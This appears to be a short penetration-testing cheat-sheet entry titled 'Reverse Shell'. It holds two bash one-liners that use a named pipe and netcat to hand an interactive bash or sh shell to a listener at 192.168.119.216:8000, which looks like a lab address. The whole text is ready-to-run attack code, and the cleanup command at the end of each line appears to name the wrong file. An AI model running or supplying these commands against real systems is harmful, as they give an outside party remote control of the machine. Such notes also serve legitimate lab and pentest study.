## Reverse Shell 

### One-liners

```bash
# Bash Shell to use when netcat's -e option is disabled.  This basically creates a circular loop between a FIFO file and the netcat session
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 192.168.119.216 8000 >/tmp/f; rm /tmp/p

# Simple shell
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.119.216 8000 >/tmp/f; rm /tmp/p
```

